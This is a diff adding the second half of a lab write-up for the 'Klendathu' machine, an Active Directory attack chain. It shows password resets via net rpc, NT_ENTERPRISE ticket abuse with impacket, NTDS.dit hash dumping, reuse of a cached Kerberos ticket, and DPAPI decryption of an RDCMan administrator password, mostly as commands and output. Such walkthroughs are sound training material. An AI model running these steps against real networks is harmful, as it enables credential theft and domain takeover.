@@ -261,7 +261,290 @@ Ok so, we need to edit the attribute "userPrincipalName" of flores or leivy (no 
 
 After that we gonna have a .ccache with which we can ssh as "Linux_Admins"
 
-In Process....
+Ok let's start : 
 
+```console
+# Note that i restart the box so we have new ip's :
 
+10.10.245.69 DC1.klendathu.vl klendathu.vl DC1
+10.10.245.70 SRV1.klendathu.vl klendathu.vl SRV1
+10.10.245.71 SRV2.klendathu.vl klendathu.vl SRV2
+```
+First we need to change their password and after the attribute in ldap, for that we gonna use ldapmodify with a .lidf file, i found this link which explain : [Modify with .ldif](https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system)
 
+And i asked to Chatgpt to create me a .ldif file and he returned me that
+
+![alt text](../assets/image_klendathu/7er.png)
+
+```bash
+net rpc password "ibanez" 'newP@ssword2022' -U "dc1.klendathu.vl"/"Rasczak"%"REDACTED" -S "10.10.243.197"
+
+cme smb 10.10.243.197 -u 'ibanez' -p 'newP@ssword2022'
+
+SMB         10.10.243.197   445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
+SMB         10.10.243.197   445    DC1              [+] KLENDATHU.VL\ibanez:newP@ssword2022
+
+net rpc password "rico" 'newP@ssword2022' -U "dc1.klendathu.vl"/"Rasczak"%"REDACTED" -S "10.10.243.197"
+
+cme smb 10.10.243.197 -u 'rico' -p 'newP@ssword2022'
+
+SMB         10.10.243.197   445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
+SMB         10.10.243.197   445    DC1              [+] KLENDATHU.VL\rico:newP@ssword2022
+```
+So now we can modify ldap and verify :
+
+![alt text](../assets/image_klendathu/8er.png)
+
+Now i tried to ask a tgt by specifying "NT_ENTERPRISE" as name type with Rubeuse on SRV1 :
+
+![alt text](../assets/image_klendathu/9er.png)
+
+But i don't know why this wasn't working
+
+So i was looking for a pull request for "impacket-getTGT" and i found this :
+
+[Pull Request](https://github.com/fortra/impacket/pull/1748)
+
+And as you can see in the example we can see that it gets a .ccache for leivy, so we can deduce that the pull request was made for this chain, perfect let's use it :
+
+```bash
+python3 getTGT.py klendathu.vl/'leivy':'newP@ssword2022' -dc-ip 10.10.245.69 -principal NT_ENTERPRISE
+
+[*] Saving ticket in leivy.ccache
+
+export KRB5CCNAME='leivy.ccache'
+
+klist
+Ticket cache: FILE:leivy.ccache
+Default principal: leivy@KLENDATHU.VL
+
+Valid starting       Expires              Service principal
+07/30/2024 14:49:34  07/31/2024 00:49:34  krbtgt/KLENDATHU.VL@KLENDATHU.VL
+        renew until 07/31/2024 14:49:44
+```
+Now we need to modify our /etc/ssh/sshd_config and our /etc/krb5.conf
+
+[Using Openssh Kerberos](https://www.ibm.com/docs/en/aix/7.1?topic=support-using-openssh-kerberos)
+
+```bash
+----- Modify this in /etc/ssh/sshd_config -----
+
+# Kerberos options
+KerberosAuthentication yes
+#KerberosOrLocalPasswd yes
+#KerberosTicketCleanup yes
+#KerberosGetAFSToken no
+
+# GSSAPI options
+GSSAPIAuthentication yes
+GSSAPICleanupCredentials yes
+#GSSAPIStrictAcceptorCheck yes
+#GSSAPIKeyExchange no
+
+----- Modify this in /etc/krb5.conf -----
+
+[libdefaults]
+    default_realm = KLENDATHU.VL
+    dns_lookup_realm = false
+    dns_lookup_kdc = true
+
+# The following krb5.conf variables are only for MIT Kerberos.
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
+
+[realms]
+    KLENDATHU.VL = {
+        kdc = dc1.klendathu.vl
+        admin_server = dc1.klendathu.vl
+    }
+
+[domain_realm]
+    .klendathu.vl = KLENDATHU.VL
+    klendathu.vl = KLENDATHU.VL
+``` 
+After that we can ssh using -K and becoming root like that :
+
+![alt text](../assets/image_klendathu/10er.png)
+
+Nice ! 
+
+## Decrypt a .rdg password using ntdissector and dpapil
+
+Now go in /root/inc5543_domaincontroller_backup/
+
+We can see a note.txt
+
+```console
+[root@srv2 inc5543_domaincontroller_backup]# cat note.txt
+Incident: INC5543
+
+I've included a backup of the domain controller before resetting all passwords after the last breach
+```
+There is also 2 files "SECURITY" & "SYSTEM" in a directory named "registry" and another directory name "Active Directory" which contains 2 files "ntds.dit" & "ntds.jfm"
+
+So download every files and my first reflex was to secretsdump :
+
+```bash
+secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c05b9e7dfd1fbbd1a3605b76c2f3caaa:::
+```
+I tried the hash :
+
+```bash
+cme ldap 10.10.245.69 -u 'Administrator' -H 'c05b9e7dfd1fbbd1a3605b76c2f3caaa'
+
+SMB         10.10.245.69    445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
+LDAP        10.10.245.69    389    DC1              [-] KLENDATHU.VL\Administrator:c05b9e7dfd1fbbd1a3605b76c2f3caaa
+```
+As said in note.txt, all passwords have been reset so the hash is that of the old password, this is why
+
+But in /tmp i found this : 
+
+```console
+[root@srv2 tmp]# ls /tmp
+krb5cc_990001135
+```
+I downloaded it and do a describeTicket on it:
+```bash
+describeTicket.py 'krb5cc_990001135'
+Impacket v0.12.0.dev1+20240604.210053.9734a1af - Copyright 2023 Fortra
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 17ce46dd70cc67524b3da4bc63f07235fde5bf51539f74edadd3addb848e0d60
+[*] User Name                     : svc_backup
+[*] User Realm                    : KLENDATHU.VL
+[*] Service Name                  : krbtgt/KLENDATHU.VL
+[*] Service Realm                 : KLENDATHU.VL
+[*] Start Time                    : 30/07/2024 16:06:29 PM
+[*] End Time                      : 31/07/2024 02:06:29 AM
+[*] RenewTill                     : 06/08/2024 16:06:29 PM
+[*] Flags                         : (0x40e10000) forwardable, renewable, initial, pre_authent, enc_pa_rep
+[*] KeyType                       : aes256_cts_hmac_sha1_96
+[*] Base64(key)                   : F85G3XDMZ1JLPaS8Y/ByNf3lv1FTn3TtrdOt24SODWA=
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/KLENDATHU.VL
+[*]   Service Realm               : KLENDATHU.VL
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+```
+So we have the svc_backup ticket
+
+```bash
+export KRB5CCNAME='krb5cc_990001135'
+
+klist
+
+Ticket cache: FILE:krb5cc_990001135
+Default principal: svc_backup@KLENDATHU.VL
+
+Valid starting       Expires              Service principal
+07/30/2024 16:06:29  07/31/2024 02:06:29  krbtgt/KLENDATHU.VL@KLENDATHU.VL
+        renew until 08/06/2024 16:06:29
+```
+```bash
+cme smb 10.10.245.69 --use-kcache
+
+SMB         10.10.245.69    445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:KLENDATHU.VL) (signing:True) (SMBv1:False)
+SMB         10.10.245.69    445    DC1              [+] KLENDATHU.VL\svc_backup from ccache
+```
+```bash
+smbclient.py klendathu.vl/svc_backup@dc1.klendathu.vl -k -no-pass -debug
+
+[+] Impacket Library Installation Path: /root/.pyenv/versions/3.11.9/lib/python3.11/site-packages/impacket
+[+] Using Kerberos Cache: krb5cc_990001135
+[+] SPN CIFS/DC1.KLENDATHU.VL@KLENDATHU.VL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for KRBTGT/KLENDATHU.VL@KLENDATHU.VL
+[+] Using TGT from cache
+[+] Trying to connect to KDC at KLENDATHU.VL:88
+```
+Then we can go in 'HomeDirs/JENKINS' :
+
+```console
+# ls
+drw-rw-rw-          0  Sat Apr 13 03:32:21 2024 .
+drw-rw-rw-          0  Thu Apr 11 02:58:10 2024 ..
+-rw-rw-rw-     101234  Sat Apr 13 03:32:11 2024 AppData_Roaming_Backup.zip
+-rw-rw-rw-       1077  Fri Apr 12 06:08:35 2024 jenkins.rdg
+```
+Unzip the first file and cat the second file which returned this :
+
+```xml
+cat jenkins.rdg
+﻿<?xml version="1.0" encoding="utf-8"?>
+<RDCMan programVersion="2.93" schemaVersion="3">
+  <file>
+    <credentialsProfiles>
+      <credentialsProfile inherit="None">
+        <profileName scope="Local">KLENDATHU\administrator</profileName>
+        <userName>administrator</userName>
+        <password>AQ[...]ShAxQ==</password>
+        <domain>KLENDATHU</domain>
+      </credentialsProfile>
+    </credentialsProfiles>
+    <properties>
+      <expanded>True</expanded>
+      <name>jenkins</name>
+    </properties>
+    <server>
+      <properties>
+        <name>dc1.klendathu.vl</name>
+      </properties>
+      <logonCredentials inherit="None">
+        <profileName scope="File">KLENDATHU\administrator</profileName>
+      </logonCredentials>
+    </server>
+  </file>
+  <connected />
+  <favorites />
+  <recentlyUsed />
+</RDCMan>
+```
+So we have a encrypted password
+
+After extracting the .zip we have also the path of master keys "./Roaming/Microsoft/Protect"
+
+[Decrypt RDG with mimikatz](https://tools.thehacker.recipes/mimikatz/modules/dpapi/rdg)
+
+We will therefore have to do a little bit like that (i mean in the idea) but in local thanks to what we have recovered im the smb
+
+Using ntdissector :
+
+[Windows secrets extraction: a summary](https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary)
+
+[The github](https://github.com/synacktiv/ntdissector)
+
+[Introducing ntdissector, a swiss army knife for your NTDS.dit files](https://www.synacktiv.com/publications/introducing-ntdissector-a-swiss-army-knife-for-your-ntdsdit-files)
+
+```bash
+ntdissector -ntds /home/samy/ntds.dit -system /home/samy/SYSTEM -outputdir /tmp/test -ts -f all
+
+cat /tmp/test/out/319ca86c07a0995d470fce37e50c44fb/secret.json | jq
+
+# get the pvk
+HvG1s[...]MuzV4=
+
+echo "HvG[...]zV4=" | base64 -d > pvk.key
+```
+We need this private key with the path where the master keys are located, we also need the SID of the user that was used to encrypt the data in order to decrypt DPAPI blobs
+
+Then i asked to ChatGPT to give me a python script on a github for decrypt the .rdg file using : PVK File, Master-Keys and the SID, he built me ​​a tool that didn't work but the tool used "dpapil", so I went to github and came across "rdgdec.py", so I'm going to use this script to decrypt the .rdg file
+
+[Script on the github](https://github.com/tijldeneut/dpapilab-ng/blob/main/rdgdec.py)
+
+```bash
+python3 rdgdec.py ../jenkins.rdg --masterkey=../Roaming/Microsoft/Protect/S-1-5-21-641890747-1618203462-755025521-1110/ --sid S-1-5-21-641890747-1618203462-755025521-1110 -k ../pvk.key
+```
+![alt text](../assets/image_klendathu/11er.png)
+
+Nice !!!
+
+Now just do a winrm 
+
+![alt text](../assets/image_klendathu/12er.png)
+
+If you have any questions or any comments on this post, you can dm me on discord : "ethicxz." or on instagram : "eliott.la"
